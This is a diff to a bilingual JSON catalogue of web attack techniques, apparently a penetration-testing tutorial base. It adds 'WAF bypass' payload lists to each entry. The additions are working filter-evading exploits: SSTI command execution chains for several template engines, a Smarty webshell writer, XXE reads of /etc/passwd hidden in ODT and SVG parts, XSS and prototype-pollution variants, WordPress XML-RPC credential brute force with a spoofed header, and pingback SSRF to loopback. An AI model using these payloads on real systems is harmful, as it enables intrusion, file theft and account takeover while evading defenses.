@@ -18,8 +18,8 @@
         "en": "Server-Side Template Injection"
       },
       "subCategory": {
-        "zh": "通用表达式探测",
-        "en": "Generic Expression Probes"
+        "zh": "探测与指纹识别",
+        "en": "Detection & Fingerprinting"
       },
       "tutorial": {
         "overview": {
@@ -121,6 +121,52 @@
         {
           "zh": "删除测试模板和输入记录，清理编译模板/页面缓存与 canary，重启隔离 renderer，并用普通变量回归渲染路径。",
           "en": "Delete test templates and input records, clear compiled-template and page caches plus canaries, restart the isolated renderer, and regress the render path with ordinary variables."
+        }
+      ],
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "单定界符族",
+            "en": "Single-delimiter family"
+          },
+          "command": "{7*7}",
+          "description": {
+            "zh": "FreeMarker 风格探测避开 {{ 规则。判据：输出 49。",
+            "en": "FreeMarker-style probe avoiding {{ rules. Success: prints 49."
+          }
+        },
+        {
+          "title": {
+            "zh": "Ruby 插值风格",
+            "en": "Ruby interpolation style"
+          },
+          "command": "#{7*7}",
+          "description": {
+            "zh": "补齐 #{} 族。判据：输出 49。",
+            "en": "Covers #{} family. Success: prints 49."
+          }
+        },
+        {
+          "title": {
+            "zh": "编码花括号",
+            "en": "Encoded braces"
+          },
+          "command": "%7B%7B7*7%7D%7D",
+          "description": {
+            "zh": "URL 编码绕过花括号字面检测。判据：回显 49。",
+            "en": "Encoded braces. Success: echoes 49."
+          }
+        },
+        {
+          "title": {
+            "zh": "组合定界符",
+            "en": "Combined delimiters"
+          },
+          "command": "__${7*7}__#{7*7}",
+          "description": {
+            "zh": "多定界符一次探测。判据：任一求值即命中。",
+            "en": "Multiple delimiters in one shot. Success: any evaluation hits."
+          }
         }
       ]
     },
@@ -279,8 +325,8 @@
         "en": "Server-Side Template Injection"
       },
       "subCategory": {
-        "zh": "FreeMarker / Java",
-        "en": "FreeMarker / Java"
+        "zh": "Java 模板引擎族",
+        "en": "Java Engine Family"
       },
       "tutorial": {
         "overview": {
@@ -384,6 +430,41 @@
           "zh": "移除测试 directive/model 和模板，清理 FreeMarker 模板缓存与 canary，恢复 resolver/object-wrapper 配置并重启测试应用。",
           "en": "Remove test directives, models, and templates, clear FreeMarker template caches and canaries, restore resolver and object-wrapper configuration, and restart the test application."
         }
+      ],
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "ObjectConstructor 链",
+            "en": "ObjectConstructor chain"
+          },
+          "command": "<#assign ob=\"freemarker.template.utility.ObjectConstructor\"?new()>${ob(\"java.lang.ProcessBuilder\",[\"id\"]).start()}",
+          "description": {
+            "zh": "换工具类避开 Execute 特征。判据：进程执行。",
+            "en": "Different utility class evades Execute signatures. Success: process runs."
+          }
+        },
+        {
+          "title": {
+            "zh": "内联 Execute",
+            "en": "Inline Execute"
+          },
+          "command": "${\"freemarker.template.utility.Execute\"?new()(\"whoami\")}",
+          "description": {
+            "zh": "单行内联改写绕过 assign 特征。判据：回显用户名。",
+            "en": "Single-line inline form. Success: username echoed."
+          }
+        },
+        {
+          "title": {
+            "zh": "JythonRuntime 执行",
+            "en": "JythonRuntime execution"
+          },
+          "command": "<#assign value=\"freemarker.template.utility.JythonRuntime\"?new()><@value>import os;os.system(\"id\")</@value>",
+          "description": {
+            "zh": "classpath 有 jython 时以 python 执行。判据：命令输出。",
+            "en": "Python execution when jython is present. Success: command output."
+          }
+        }
       ]
     },
     {
@@ -401,8 +482,8 @@
         "en": "Server-Side Template Injection"
       },
       "subCategory": {
-        "zh": "Jinja2 / Python Flask",
-        "en": "Jinja2 / Python Flask"
+        "zh": "Jinja2 与 Python 系",
+        "en": "Jinja2 & Python Family"
       },
       "tutorial": {
         "overview": {
@@ -509,6 +590,52 @@
           "zh": "删除测试 route/template/object 与 canary，清理 Jinja2/Flask 缓存和测试请求，轮换临时会话并重启隔离 worker。",
           "en": "Delete test routes, templates, objects, and canaries, clear Jinja2 and Flask caches plus test requests, rotate temporary sessions, and restart isolated workers."
         }
+      ],
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "builtins 直读文件",
+            "en": "builtins direct file read"
+          },
+          "command": "{{get_flashed_messages.__globals__.__builtins__.open('/etc/passwd').read()}}",
+          "description": {
+            "zh": "换 gadget 读任意文件。判据：返回 passwd。",
+            "en": "Alternate gadget for arbitrary read. Success: passwd returned."
+          }
+        },
+        {
+          "title": {
+            "zh": "下标访问绕过点过滤",
+            "en": "Subscript access bypassing dots"
+          },
+          "command": "{{url_for.__globals__['__builtins__']['__import__']('os').popen('id').read()}}",
+          "description": {
+            "zh": "关键步骤用下标替代属性点。判据：回显 uid。",
+            "en": "Subscripts replace attribute dots. Success: uid echoed."
+          }
+        },
+        {
+          "title": {
+            "zh": "request 字典访问",
+            "en": "request dict access"
+          },
+          "command": "{{request['application']['__globals__']['__builtins__']}}",
+          "description": {
+            "zh": "纯下标链绕过双下划线过滤。判据：返回 builtins 对象。",
+            "en": "Pure subscript chain. Success: builtins object returned."
+          }
+        },
+        {
+          "title": {
+            "zh": "self 上下文链",
+            "en": "self context chain"
+          },
+          "command": "{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}",
+          "description": {
+            "zh": "经模板上下文兜底。判据：命令输出。",
+            "en": "Falls back through the template context. Success: command output."
+          }
+        }
       ]
     },
     {
@@ -526,8 +653,8 @@
         "en": "XML External Entity (XXE)"
       },
       "subCategory": {
-        "zh": "OpenDocument / ODT",
-        "en": "OpenDocument / ODT"
+        "zh": "办公文档载体",
+        "en": "Office Document Carriers"
       },
       "tutorial": {
         "overview": {
@@ -630,6 +757,41 @@
           "zh": "删除 ODT、解包临时目录、索引/预览产物和 marker，清理转换队列与缓存，并重启隔离 office worker。",
           "en": "Delete ODT files, extraction directories, index or preview artifacts, and markers, clear conversion queues and caches, and restart isolated office workers."
         }
+      ],
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "meta.xml 部件变体",
+            "en": "meta.xml Part Variant"
+          },
+          "command": "meta.xml:\n<?xml version=\"1.0\"?><!DOCTYPE m [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><office:document-meta>&x;</office:document-meta>",
+          "description": {
+            "zh": "实体移到 meta.xml 元数据部件，绕过 content.xml 定向扫描；成功判据：文档属性含 passwd 内容。",
+            "en": "Moves the entity into meta.xml to bypass content.xml-focused scanning. Success: document properties contain passwd contents."
+          }
+        },
+        {
+          "title": {
+            "zh": "styles 部件变体",
+            "en": "styles Part Variant"
+          },
+          "command": "styles.xml:\n<?xml version=\"1.0\"?><!DOCTYPE s [<!ENTITY x SYSTEM \"file:///etc/hostname\">]><office:document-styles><style:style style:name=\"&x;\"/></office:document-styles>",
+          "description": {
+            "zh": "实体用于样式名属性位，规避正文内容检测；成功判据：样式系统泄露主机名。",
+            "en": "Uses the entity in a style-name attribute to evade body-content inspection. Success: the styles subsystem leaks the hostname."
+          }
+        },
+        {
+          "title": {
+            "zh": "单斜杠 file 变体",
+            "en": "Single-Slash file Variant"
+          },
+          "command": "content.xml:\n<?xml version=\"1.0\"?><!DOCTYPE c [<!ENTITY x SYSTEM \"file:/etc/passwd\">]><office:document-content><office:body>&x;</office:body></office:document-content>",
+          "description": {
+            "zh": "file:/ 单斜杠等价形式规避 file:/// 固定前缀规则；成功判据：正文仍回显 passwd。",
+            "en": "Uses the equivalent single-slash file:/ form to evade the fixed file:/// prefix rule. Success: the body still echoes passwd."
+          }
+        }
       ]
     },
     {
@@ -647,8 +809,8 @@
         "en": "Prototype Pollution"
       },
       "subCategory": {
-        "zh": "Node.js 对象合并",
-        "en": "Node.js Object Merging"
+        "zh": "服务端 JSON 合并污染",
+        "en": "Server-side JSON Merge Pollution"
       },
       "tutorial": {
         "overview": {
@@ -755,6 +917,41 @@
       "tags": [
         "ssti2",
         "prototype_pollution"
+      ],
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "constructor.prototype 替代语法",
+            "en": "constructor.prototype Alternative Syntax"
+          },
+          "command": "{\"constructor\":{\"prototype\":{\"admin\":true}}}\n{\"constructor\":{\"prototype\":{\"role\":\"admin\"}}}",
+          "description": {
+            "zh": "绕过仅匹配 __proto__ 键的 WAF 规则：constructor.prototype 等价触达原型。成功判据：目标出现注入的 admin/role 属性。",
+            "en": "Bypasses WAF rules matching only the __proto__ key since constructor.prototype reaches the prototype equivalently. Success: the target exhibits the injected admin/role properties."
+          }
+        },
+        {
+          "title": {
+            "zh": "Unicode 转义键名",
+            "en": "Unicode-Escaped Key Names"
+          },
+          "command": "{\"\\u005f\\u005fproto\\u005f\\u005f\":{\"admin\":true}}\n{\"__pro\\u0074o\":{\"role\":\"admin\"}}",
+          "description": {
+            "zh": "绕过 JSON 体中 __proto__ 明文特征：转义在 JSON.parse 后还原。成功判据：还原键触达原型合并。",
+            "en": "Bypasses plaintext __proto__ signatures in the JSON body since escapes resolve after JSON.parse. Success: the resolved key reaches prototype merging."
+          }
+        },
+        {
+          "title": {
+            "zh": "点路径与表单语法",
+            "en": "Dot-Path & Form Syntax"
+          },
+          "command": "__proto__.admin=true\n__proto__[role]=admin",
+          "description": {
+            "zh": "绕过 JSON 专用检测：表单/点路径语法经 qs 深解析触达原型。成功判据：表单提交同样完成污染。",
+            "en": "Bypasses JSON-only detection since form/dot-path syntax reaches the prototype via qs deep parsing. Success: the form submission pollutes just the same."
+          }
+        }
       ]
     },
     {
@@ -772,8 +969,8 @@
         "en": "Server-Side Template Injection"
       },
       "subCategory": {
-        "zh": "Smarty / PHP",
-        "en": "Smarty / PHP"
+        "zh": "PHP 模板引擎族",
+        "en": "PHP Engine Family"
       },
       "tutorial": {
         "overview": {
@@ -877,6 +1074,41 @@
           "zh": "删除测试模板/plugin/canary，清空 Smarty compile/cache 目录中的测试产物，恢复安全策略并重启隔离 PHP worker。",
           "en": "Delete test templates, plugins, and canaries, clear test artifacts from Smarty compile and cache directories, restore the security policy, and restart isolated PHP workers."
         }
+      ],
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "if 条件执行",
+            "en": "if-tag execution"
+          },
+          "command": "{if system('id')}{/if}",
+          "description": {
+            "zh": "以 {if} 标签执行函数。判据：回显 uid。",
+            "en": "Executes inside {if}. Success: uid echoed."
+          }
+        },
+        {
+          "title": {
+            "zh": "写文件落 webshell",
+            "en": "Write-file webshell"
+          },
+          "command": "{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,'<?php system($_GET[0]); ?>',getcwd())}",
+          "description": {
+            "zh": "直接写 shell 到当前目录。判据：可访问新文件执行命令。",
+            "en": "Drops a shell into the working directory. Success: new file executes commands."
+          }
+        },
+        {
+          "title": {
+            "zh": "大小写标签混淆",
+            "en": "Case-obfuscated tags"
+          },
+          "command": "{PHP}echo `id`;{/PHP}",
+          "description": {
+            "zh": "大小写变形绕过 {php} 规则。判据：命令输出。",
+            "en": "Case variance on the tag. Success: command output."
+          }
+        }
       ]
     },
     {
@@ -894,8 +1126,8 @@
         "en": "Server-Side Template Injection"
       },
       "subCategory": {
-        "zh": "多引擎指纹识别",
-        "en": "Multi-Engine Fingerprinting"
+        "zh": "探测与指纹识别",
+        "en": "Detection & Fingerprinting"
       },
       "tutorial": {
         "overview": {
@@ -1001,6 +1233,52 @@
           "zh": "删除候选输入和编译模板，清理各引擎缓存/错误日志/canary，重启测试 renderer，并记录排除与确认的引擎版本。",
           "en": "Delete candidate inputs and compiled templates, clear each engine's caches, error logs, and canaries, restart test renderers, and record excluded and confirmed engine versions."
         }
+      ],
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "类型差异指纹",
+            "en": "Type-coercion fingerprint"
+          },
+          "command": "{{7*'7'}}",
+          "description": {
+            "zh": "一次探测区分引擎族：Jinja2 输出 7777777、Twig 输出 49。判据：回显符合其一即可定引擎。",
+            "en": "One probe splits families: Jinja2 prints 7777777, Twig prints 49. Success: echo matches one of them."
+          }
+        },
+        {
+          "title": {
+            "zh": "多定界符组合",
+            "en": "Multi-delimiter combo"
+          },
+          "command": "${7*7}#{{7*7}}<%= 7*7 %>",
+          "description": {
+            "zh": "单请求覆盖三类定界符减少 WAF 往返。判据：任一表达式求值即存在注入。",
+            "en": "Covers three delimiter families in one request. Success: any evaluation proves injection."
+          }
+        },
+        {
+          "title": {
+            "zh": "URL 编码探测",
+            "en": "URL-encoded probe"
+          },
+          "command": "%7B%7B7*7%7D%7D",
+          "description": {
+            "zh": "编码花括号绕过字面规则。判据：解码后回显 49。",
+            "en": "Encoded braces. Success: echoes 49 after decoding."
+          }
+        },
+        {
+          "title": {
+            "zh": "Velocity 风格探测",
+            "en": "Velocity-style probe"
+          },
+          "command": "#set($x=7*7)$x",
+          "description": {
+            "zh": "补齐 # 风格引擎指纹。判据：输出 49。",
+            "en": "Covers #-style engines. Success: prints 49."
+          }
+        }
       ]
     },
     {
@@ -1018,8 +1296,8 @@
         "en": "Cross-Site Scripting (XSS)"
       },
       "subCategory": {
-        "zh": "SVG onload 枚举探测",
-        "en": "SVG onload Enumeration Probes"
+        "zh": "反射型与标签变体",
+        "en": "Reflected & Tag Variants"
       },
       "tutorial": {
         "overview": {
@@ -1122,6 +1400,52 @@
           "zh": "删除 SVG 和嵌入节点，撤销 blob/object URL，清理浏览器/CDN/图片缓存和 CSP 报告，并重载宿主页确认无执行。",
           "en": "Delete SVGs and embed nodes, revoke blob and object URLs, clear browser, CDN, and image caches plus CSP reports, and reload the host page to confirm no execution."
         }
+      ],
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "SMIL 事件替代 onload",
+            "en": "SMIL event instead of onload"
+          },
+          "command": "<svg><animate attributeName=x dur=1s onbegin=alert(1)></svg>",
+          "description": {
+            "zh": "绕过 onload 关键字过滤：改用 animate 的 onbegin 事件。判据：页面加载即弹窗。",
+            "en": "Swaps the filtered onload for an SMIL onbegin event on animate. Success: alert fires on load."
+          }
+        },
+        {
+          "title": {
+            "zh": "实体编码事件代码",
+            "en": "Entity-encoded handler body"
+          },
+          "command": "<svg onload=&#97;&#108;&#101;&#114;&#116;(1)>",
+          "description": {
+            "zh": "绕过 alert 关键词检测：handler 内容用十进制实体编码。判据：实体被浏览器解码后执行弹窗。",
+            "en": "Encodes the handler body as decimal entities so keyword rules miss it. Success: browser decodes and executes alert."
+          }
+        },
+        {
+          "title": {
+            "zh": "xlink 导航型 SVG",
+            "en": "xlink navigation payload"
+          },
+          "command": "<svg><a xlink:href=\"javascript:alert(1)\"><text x=20 y=20>click</text></a></svg>",
+          "description": {
+            "zh": "绕过事件属性过滤：改用 xlink:href 的 javascript: 导航，需一次用户点击。判据：点击文本后弹窗。",
+            "en": "Avoids event attributes entirely via an xlink javascript: URL. Success: alert after clicking the text."
+          }
+        },
+        {
+          "title": {
+            "zh": "foreignObject 双命名空间",
+            "en": "foreignObject dual namespace"
+          },
+          "command": "<svg><foreignObject><body xmlns=\"http://www.w3.org/1999/xhtml\"><script>alert(1)</script></body></foreignObject></svg>",
+          "description": {
+            "zh": "绕过 SVG 内 script 过滤：通过 foreignObject 嵌入 XHTML 命名空间执行脚本。判据：弹窗触发。",
+            "en": "Embeds an XHTML body inside foreignObject to run script despite SVG-context filters. Success: alert fires."
+          }
+        }
       ]
     },
     {
@@ -1139,8 +1463,8 @@
         "en": "XML External Entity (XXE)"
       },
       "subCategory": {
-        "zh": "SVG image xlink 文件读取",
-        "en": "SVG image xlink File Read"
+        "zh": "文件读取与编码",
+        "en": "File Read & Encoding"
       },
       "tutorial": {
         "overview": {
@@ -1242,6 +1566,41 @@
         {
           "zh": "删除 SVG、marker 资源和渲染产物，关闭自有端点，清理图像/转换缓存与任务日志，并重启隔离 renderer。",
           "en": "Delete SVGs, marker resources, and render artifacts, close owned endpoints, clear image and conversion caches plus job logs, and restart isolated renderers."
+        }
+      ],
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "data URI xlink 变体",
+            "en": "data URI xlink Variant"
+          },
+          "command": "<?xml version=\"1.0\"?><svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\"><image width=\"10\" height=\"10\" xlink:href=\"data:text/plain;base64,PD9waHAgZWNobygxKTs/Pg==\"/></svg>",
+          "description": {
+            "zh": "改用 data URI 载体验证 xlink 外链解析能力，规避 file:// 协议检测；成功判据：解析器接受外链（错误差异验证）。",
+            "en": "Uses a data URI to probe xlink resolution, evading file:// protocol detection. Success: parser accepts the external reference (verify via error differential)."
+          }
+        },
+        {
+          "title": {
+            "zh": "双阶段外链变体",
+            "en": "Two-Stage External Link Variant"
+          },
+          "command": "<?xml version=\"1.0\" standalone=\"yes\"?><!DOCTYPE svg [<!ENTITY u SYSTEM \"http://{LAB_OAST}/stage1\">]><svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\"><image width=\"10\" height=\"10\" xlink:href=\"&u;/file.xml\"/></svg>",
+          "description": {
+            "zh": "实体仅承载攻击者域前缀，最终 URL 由实体拼接，规避完整外链明文；成功判据：{LAB_OAST} 收到带 /file.xml 的请求。",
+            "en": "The entity carries only the attacker host prefix while the final URL is assembled, avoiding a full literal external link. Success: {LAB_OAST} receives the /file.xml request."
+          }
+        },
+        {
+          "title": {
+            "zh": "href 路径穿越变体",
+            "en": "href Path Traversal Variant"
+          },
+          "command": "<?xml version=\"1.0\"?><svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\"><image width=\"10\" height=\"10\" xlink:href=\"../../../../etc/passwd\"/></svg>",
+          "description": {
+            "zh": "相对路径穿越替代 file:// 绝对协议，绕过协议白名单；成功判据：解析行为出现差异（错误/内容）。",
+            "en": "Uses relative traversal instead of the file:// scheme to bypass protocol allowlists. Success: parsing behavior differs (error or content)."
+          }
         }
       ]
     },
@@ -1400,8 +1759,8 @@
         "en": "Server-Side Template Injection"
       },
       "subCategory": {
-        "zh": "Thymeleaf / SpringEL",
-        "en": "Thymeleaf / SpringEL"
+        "zh": "Java 模板引擎族",
+        "en": "Java Engine Family"
       },
       "tutorial": {
         "overview": {
@@ -1504,6 +1863,41 @@
           "zh": "删除测试视图/bean/canary，清理 Thymeleaf 和 SpringEL 缓存，恢复 view resolver/安全上下文并重启测试实例。",
           "en": "Delete test views, beans, and canaries, clear Thymeleaf and SpringEL caches, restore the view resolver and safe context, and restart the test instance."
         }
+      ],
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "星号语法执行",
+            "en": "Star-syntax execution"
+          },
+          "command": "*{T(java.lang.Runtime).getRuntime().exec('id')}",
+          "description": {
+            "zh": "以 *{} 替代 __${} 绕过定界符规则。判据：命令执行（无回显用延迟验证）。",
+            "en": "Star syntax instead of __${}. Success: command executes (verify via delay)."
+          }
+        },
+        {
+          "title": {
+            "zh": "ProcessBuilder 执行",
+            "en": "ProcessBuilder execution"
+          },
+          "command": "__${new java.lang.ProcessBuilder({'id'}).start()}__::.x",
+          "description": {
+            "zh": "换 ProcessBuilder 类族。判据：进程创建。",
+            "en": "Different class family. Success: process spawns."
+          }
+        },
+        {
+          "title": {
+            "zh": "盲延时探测",
+            "en": "Blind timing probe"
+          },
+          "command": "__${T(java.lang.Thread).sleep(5000)}__::.x",
+          "description": {
+            "zh": "无回显时以延迟判断求值。判据：响应慢 5 秒。",
+            "en": "Delay oracle when output is hidden. Success: response slower by 5s."
+          }
+        }
       ]
     },
     {
@@ -1521,8 +1915,8 @@
         "en": "Server-Side Template Injection"
       },
       "subCategory": {
-        "zh": "Twig / PHP",
-        "en": "Twig / PHP"
+        "zh": "PHP 模板引擎族",
+        "en": "PHP Engine Family"
       },
       "tutorial": {
         "overview": {
@@ -1625,6 +2019,41 @@
         {
           "zh": "移除测试 function/filter/template 与 canary，清空 Twig 编译缓存和 debug 输出，恢复 SandboxExtension 策略并重启 worker。",
           "en": "Remove test functions, filters, templates, and canaries, clear Twig compilation caches and debug output, restore SandboxExtension policy, and restart workers."
+        }
+      ],
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "map 回调执行",
+            "en": "map callback execution"
+          },
+          "command": "{{['id']|map('system')}}",
+          "description": {
+            "zh": "以 map 过滤器调 system。判据：回显 uid。",
+            "en": "map filter invokes system. Success: uid echoed."
+          }
+        },
+        {
+          "title": {
+            "zh": "filter 回调执行",
+            "en": "filter callback execution"
+          },
+          "command": "{{['whoami']|filter('system')}}",
+          "description": {
+            "zh": "filter 过滤器回调。判据：回显用户名。",
+            "en": "filter filter callback. Success: username echoed."
+          }
+        },
+        {
+          "title": {
+            "zh": "sort 回调执行",
+            "en": "sort callback execution"
+          },
+          "command": "{{['id']|sort('system')}}",
+          "description": {
+            "zh": "sort 的 usort 回调执行。判据：命令输出。",
+            "en": "sort invokes via usort callback. Success: command output."
+          }
         }
       ]
     },
@@ -1784,8 +2213,8 @@
         "en": "WordPress XML-RPC"
       },
       "subCategory": {
-        "zh": "方法与能力枚举",
-        "en": "Method and Capability Enumeration"
+        "zh": "组件与库漏洞",
+        "en": "Component & Library Vulnerabilities"
       },
       "tutorial": {
         "overview": {
@@ -1888,6 +2317,41 @@
           "zh": "关闭测试会话，删除 method 审计和临时响应，恢复 XML-RPC/插件最小化配置并重放允许与禁止方法基线。",
           "en": "Close test sessions, delete method audit and temporary responses, restore minimized XML-RPC and plugin configuration, and replay allowed and denied method baselines."
         }
+      ],
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "multicall 批量枚举变体",
+            "en": "multicall Batch Enumeration Variant"
+          },
+          "command": "<?xml version=\"1.0\"?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data><value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value>admin</value><value>{ATTACKER_CREDS}</value></data></array></value></member></struct></value></data></array></value></param></params></methodCall>",
+          "description": {
+            "zh": "绕过对单次 listMethods 的频率与特征限制：一次 multicall 并行枚举+爆破；成功判据：响应数组包含方法清单或账号回显。",
+            "en": "Bypasses per-request listMethods rate/signature limits by batching enumeration and brute force in one multicall. Success: the response array includes methods list or account echo."
+          }
+        },
+        {
+          "title": {
+            "zh": "实体编码方法名变体",
+            "en": "Entity-Encoded Method Name Variant"
+          },
+          "command": "<?xml version=\"1.0\"?><methodCall><methodName>&#115;ystem.listMethods</methodName><params></params></methodCall>",
+          "description": {
+            "zh": "方法名首字母数字实体编码，规避对 system.listMethods 明文的匹配；成功判据：仍返回方法列表。",
+            "en": "Entity-encodes the first letter of the method name to evade plaintext matching. Success: the method list still returns."
+          }
+        },
+        {
+          "title": {
+            "zh": "头部伪装变体",
+            "en": "Header Camouflage Variant"
+          },
+          "command": "curl -s https://{TARGET}/xmlrpc.php -H 'X-Forwarded-For: 127.0.0.1' -H 'Content-Type: text/xml' --data-binary '<methodCall><methodName>system.listMethods</methodName></methodCall>'",
+          "description": {
+            "zh": "伪造内网 XFF 头绕过基于来源的 WAF/限流策略；成功判据：请求不再 403 且返回方法列表。",
+            "en": "Spoofs an internal XFF header to bypass origin-based WAF/rate limiting. Success: no more 403 and the method list returns."
+          }
+        }
       ]
     },
     {
@@ -1905,8 +2369,8 @@
         "en": "Authentication Security"
       },
       "subCategory": {
-        "zh": "XML-RPC 登录限速",
-        "en": "XML-RPC Login Rate Limiting"
+        "zh": "凭证注入与弱类型登录绕过",
+        "en": "Credential Injection & Weak-Typing Login Bypass"
       },
       "tutorial": {
         "overview": {
@@ -2013,6 +2477,41 @@
           "zh": "重置/删除测试账户与锁定计数，吊销测试会话/应用密码，清理 XML-RPC/WAF 日志和队列邮件，恢复速率限制配置。",
           "en": "Reset or delete the test account and lockout counters, revoke test sessions and application passwords, clear XML-RPC and WAF logs plus queued mail, and restore rate-limit configuration."
         }
+      ],
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "system.multicall 批量认证",
+            "en": "system.multicall Batch Auth"
+          },
+          "command": "<?xml version=\"1.0\"?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data><value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><string>admin</string></value><value><string>{LAB_PASSWORD}</string></value></data></array></value></member></struct></value><value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><string>editor</string></value><value><string>{LAB_PASSWORD}</string></value></data></array></value></member></struct></value></data></array></value></param></params></methodCall>",
+          "description": {
+            "zh": "绕过按请求数计数的登录限速：单请求批量携带多组凭据尝试。成功判据：单请求返回多个账户的认证结果。",
+            "en": "Bypasses per-request login rate limits by batching multiple credential attempts in one system.multicall. Success: a single request returns auth results for multiple accounts."
+          }
+        },
+        {
+          "title": {
+            "zh": "实体编码用户名",
+            "en": "Entity-Encoded Username"
+          },
+          "command": "<?xml version=\"1.0\"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value><string>&#97;dmin</string></value></param><param><value><string>{LAB_PASSWORD}</string></value></param></params></methodCall>",
+          "description": {
+            "zh": "绕过 XML 体中 admin 明文特征：实体编码在解析层还原。成功判据：认证响应与明文一致。",
+            "en": "Bypasses plaintext admin signatures in the XML body since entity encoding resolves at parse time. Success: auth response matches the plaintext run."
+          }
+        },
+        {
+          "title": {
+            "zh": "方法替换探测",
+            "en": "Method Swap Probing"
+          },
+          "command": "for m in wp.getUsersBlogs wp.getProfile wp.getComments; do printf '<?xml version=\"1.0\"?><methodCall><methodName>%s</methodName><params><param><value><string>admin</string></value></param><param><value><string>{LAB_PASSWORD}</string></value></param></params></methodCall>' \"$m\" | curl -sS --max-time 5 -H \"Content-Type: text/xml\" --data-binary @- http://127.0.0.1:8080/xmlrpc.php | head -c 200; echo; done",
+          "description": {
+            "zh": "绕过针对 getUsersBlogs 的方法级限速规则：换用未限速方法验证凭据。成功判据：任一方法返回认证成功。",
+            "en": "Bypasses per-method rate limits on getUsersBlogs by verifying credentials via unthrottled methods. Success: any method returns an auth success."
+          }
+        }
       ]
     },
     {
@@ -2030,8 +2529,8 @@
         "en": "Server-Side Request Forgery (SSRF)"
       },
       "subCategory": {
-        "zh": "WordPress Pingback",
-        "en": "WordPress Pingback"
+        "zh": "应用功能与回调 SSRF",
+        "en": "Application Feature & Callback SSRF"
       },
       "tutorial": {
         "overview": {
@@ -2135,6 +2634,41 @@
           "zh": "删除测试来源/目标文章和 pingback 记录，关闭监听端点，清理 DNS/HTTP/XML-RPC 日志与缓存，并恢复 Pingback 配置。",
           "en": "Delete test source and target posts plus pingback records, close listener endpoints, clear DNS, HTTP, XML-RPC logs and caches, and restore Pingback configuration."
         }
+      ],
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "multicall 批量包装",
+            "en": "multicall Batch Wrapping"
+          },
+          "command": "<?xml version=\"1.0\"?><methodCall><methodName>system.multicall</methodName>\n<params><param><value><array><data>\n<value><struct><member><name>methodName</name><value><string>pingback.ping</string></value></member>\n<member><name>params</name><value><array><data><value><string>http://127.0.0.1:8080/</string></value></data></array></value></member></struct></value>\n</data></array></value></param></params></methodCall>",
+          "description": {
+            "zh": "绕过对顶层 pingback.ping 方法名的拦截：包进 system.multicall 批量结构；WordPress 仍发出回调即成功。",
+            "en": "Wrap the call inside a system.multicall batch to evade top-level method-name interception; WordPress still issuing the callback confirms success."
+          }
+        },
+        {
+          "title": {
+            "zh": "Base64 编码目标",
+            "en": "Base64-Encoded Target"
+          },
+          "command": "<?xml version=\"1.0\"?><methodCall><methodName>pingback.ping</methodName>\n<params><param><value><base64>aHR0cDovLzEyNy4wLjAuMTo4MDgwLw==</base64></value></param></params></methodCall>",
+          "description": {
+            "zh": "绕过对参数中内网 URL 明文的扫描：目标以 base64 类型传输由库解码；pingback 到达内部地址即成功。",
+            "en": "Transport the internal URL as a base64-typed value decoded by the library; a pingback reaching the internal address confirms success."
+          }
+        },
+        {
+          "title": {
+            "zh": "实体编码 URL",
+            "en": "Entity-Encoded URL"
+          },
+          "command": "<?xml version=\"1.0\"?><methodCall><methodName>pingback.ping</methodName>\n<params><param><value><string>http://&#49;&#50;&#55;.0.0.1:8080/</string></value></param></params></methodCall>",
+          "description": {
+            "zh": "绕过对 127.0.0.1 字面特征的匹配：数字以十进制实体表示，XML 解析后还原；回调生成即成功。",
+            "en": "Encode digits as decimal entities so the literal loopback string is absent until XML parsing; a generated callback confirms success."
+          }
+        }
       ]
     },
     {
@@ -2152,8 +2686,8 @@
         "en": "Server-Side Request Forgery (SSRF)"
       },
       "subCategory": {
-        "zh": "Pingback 内部目标控制",
-        "en": "Pingback Restricted-Destination Controls"
+        "zh": "应用功能与回调 SSRF",
+        "en": "Application Feature & Callback SSRF"
       },
       "tutorial": {
         "overview": {
@@ -2255,6 +2789,41 @@
         {
           "zh": "关闭内部/外部监听器，删除测试文章、令牌和 pingback 记录，清理 DNS/代理/XML-RPC 日志，恢复出站 ACL 和 URL 校验。",
           "en": "Close internal and external listeners, delete test posts, tokens, and pingback records, clear DNS, proxy, and XML-RPC logs, and restore egress ACLs and URL validation."
+        }
+      ],
+      "wafBypass": [
+        {
+          "title": {
+            "zh": "方法名与空白混淆",
+            "en": "Method Name and Whitespace Confusion"
+          },
+          "command": "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<methodCall>\n  <methodName> system.multicall </methodName>\n  <params><param><value><string>http://127.0.0.1:8080/</string></value></param></params>\n</methodCall>",
+          "description": {
+            "zh": "绕过对 pingback.ping 精确方法名的拦截：改走 system.multicall 包装并混入空白字符；WordPress 生成对内网的回调请求即成功。",
+            "en": "Wrap the call in system.multicall with stray whitespace to evade the exact pingback.ping signature; WordPress issuing an internal callback confirms success."
+          }
+        },
+        {
+          "title": {
+            "zh": "CDATA 包裹参数",
+            "en": "CDATA-Wrapped Parameter"
+          },
